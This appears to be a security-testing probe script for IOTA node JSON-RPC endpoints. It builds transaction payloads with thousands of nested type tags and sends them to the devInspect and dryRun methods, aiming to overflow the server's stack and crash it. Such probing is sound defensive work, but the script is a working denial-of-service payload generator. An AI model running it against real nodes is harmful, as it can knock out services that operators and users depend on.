#!/usr/bin/env bash
# Probe: deeply nested TypeInput inside a syntactically-valid TransactionKind.
#
# `iota_devInspectTransactionBlock` decodes its `tx_bytes` argument as
# BCS-of-`TransactionKind`. We hand-craft a `ProgrammableTransaction`
# containing `Command::MakeMoveVec(Some(deeply_nested_TypeInput), [])` so
# that the deserializer actually walks the nested `Box<TypeInput>` chain
# (the prior probe stopped at the outer wrapper because the first byte
# didn't match a valid `TransactionKind` variant).
#
# The Rust BCS deserializer for `TypeInput::Vector(Box<TypeInput>)` is
# implemented via recursive serde — each Vector level allocates a stack
# frame. The bcs crate caps `MAX_CONTAINER_DEPTH = 500`, but each frame
# costs hundreds of bytes; if the JSON-RPC server runs on a Tokio worker
# with a small stack the chain may still exhaust it before BCS rejects
# the payload.
set -u
HERE="$(dirname "$0")"
. "$HERE/lib.sh"

probe() { run_probe "deep_typeinput/$1" "$2" || return 1; }

ADDR='0x0000000000000000000000000000000000000000000000000000000000000001'

build_payload() {
  python3 - "$1" <<'PY'
import base64, sys
n = int(sys.argv[1])
# TransactionKind::ProgrammableTransaction (variant 0)
b  = bytes([0x00])
# inputs: empty Vec
b += bytes([0x00])
# commands: 1
b += bytes([0x01])
# Command::MakeMoveVec (variant 5 in current Command enum)
b += bytes([0x05])
# Option<TypeInput>::Some
b += bytes([0x01])
# n-deep TypeInput::Vector(Box<TypeInput>) tags, then U8 terminator
b += bytes([0x06]) * n + bytes([0x01])
# Vec<Argument>: empty
b += bytes([0x00])
sys.stdout.write(base64.b64encode(b).decode())
PY
}

for n in 64 128 256 499 500 501 1000 2000 5000; do
  payload=$(build_payload "$n")
  probe "n_${n}" '{
    "jsonrpc":"2.0","id":1,"method":"iota_devInspectTransactionBlock",
    "params":["'"$ADDR"'","'"$payload"'",null,null,null]
  }'
done

# Also probe iota_dryRunTransactionBlock with a TransactionData wrapping a
# TransactionKind that has the same nested TypeInput. TransactionData::V1
# shape:
#   TransactionDataV1 { kind: TransactionKind, sender: IotaAddress (32B),
#                       gas_data: GasData, expiration: TransactionExpiration }
# We don't need this to be semantically valid — only valid enough that the
# deserializer reaches the TypeInput chain inside `kind`.
build_dryrun_payload() {
  python3 - "$1" <<'PY'
import base64, sys
n = int(sys.argv[1])
# TransactionData::V1 (variant 0)
b = bytes([0x00])
# TransactionKind::ProgrammableTransaction (0) + empty inputs + 1 command
b += bytes([0x00, 0x00, 0x01])
# Command::MakeMoveVec(Some(nested), [])
b += bytes([0x05, 0x01]) + (bytes([0x06]) * n) + bytes([0x01]) + bytes([0x00])
# sender: 32 zero bytes
b += b'\x00' * 32
# GasData: payment = empty Vec<ObjectRef>, owner = IotaAddress(32B), price=0, budget=0
b += bytes([0x00])           # payment count = 0
b += b'\x00' * 32            # owner
b += bytes([0]) * 8          # price (u64) - need uleb? no, fixed-int. use 8 bytes
b += bytes([0]) * 8          # budget (u64)
# TransactionExpiration::None (variant 0)
b += bytes([0x00])
sys.stdout.write(base64.b64encode(b).decode())
PY
}

for n in 64 256 499 500 501 1000; do
  payload=$(build_dryrun_payload "$n")
  probe "dryrun_n_${n}" '{
    "jsonrpc":"2.0","id":1,"method":"iota_dryRunTransactionBlock",
    "params":["'"$payload"'"]
  }'
done
